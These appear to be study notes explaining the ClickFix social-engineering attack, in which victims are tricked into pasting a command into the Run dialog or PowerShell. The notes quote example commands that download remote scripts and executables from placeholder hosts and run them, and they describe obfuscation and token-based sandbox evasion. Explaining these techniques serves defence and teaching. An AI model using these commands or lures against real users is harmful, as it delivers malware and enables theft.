ClickFix:
  ClickFix is a social engineering driven + script based attack, in which the threat actor lures the victim
  to "Fix" something by copy-paste a command in (RunDiagnol/Powershell/CMD Termainal) that downloads malware.

So instead of exploiting a software vulnerabilities, the threat actor makes the user to execute malicious commands.

Typical lure will be like:
  Fix your PC
  Verification Required
  Fake captcha
  update browser
  Install codec ...

Victim copies the command --> run it --> Malware downloads.

=============================================================
CLICKFIX ATTACK FLOW:
=============================================================
Website / Email lure
        ↓
Fake instruction "Press Win + R"
        ↓
User pastes command
        ↓
PowerShell / CMD executes
        ↓
Payload downloaded
        ↓
Second stage executed
        ↓
Persistence / C2 connection.

================================================================

1. Initial Access (User Trick)

Press Windows + R
Paste below:
powershell -c "iwr http://malicious.site/file.ps1 | iex"

user runs  ==> Powershell Executes
Break down

Powershell                ==>    Launches Powershell
-c""                      ==>    Run what ever is there in strings as a command; where -c is a command
iwr(Invoke-WebRequest)    ==>    Fetch the Information/data from the server; but not saving to the disk
iex                       ==>    Execute

Meaning: Launch powershell &  fetch file.ps1 & Execute immediately

2. Stage 1 Loader (Downloader)
This script usually:
  Checks sandbox
  Uses token parameter
  Downloads secon payload

Eg:
$u="http://site/payload.exe"
Invoke-WebRequest $u -OutFile $env:TEMP\file.exe
Start-Process $env:TEMP\file.exe
Breakdown:
$u                                 ==> Variable
-Outfile [filepath to save]        ==> writeout/save
Start-Process                      ==> start the process

Meaning: Fetch payload.exe & save it to temp file & run it

3. Stage 2 Payload:
This is real Malware: InfoStealer/RAT/Loader/Cobalt Strike/Lumma/Red line/AsyncRaT.

4. Defense Evasion Techniques:
ClickFix often uses:
- Obfuscation                    :    powershell -enc SQBtAHAA...
- String splitting               :    "po"+"wer"+"shell"
- Environment Variables          :    $env:APPDATA

5. SandBox Evasion:
  ?token=unused
      Purpose:
          Only real user gets payload
          Sandbox blocked
          One-time download























































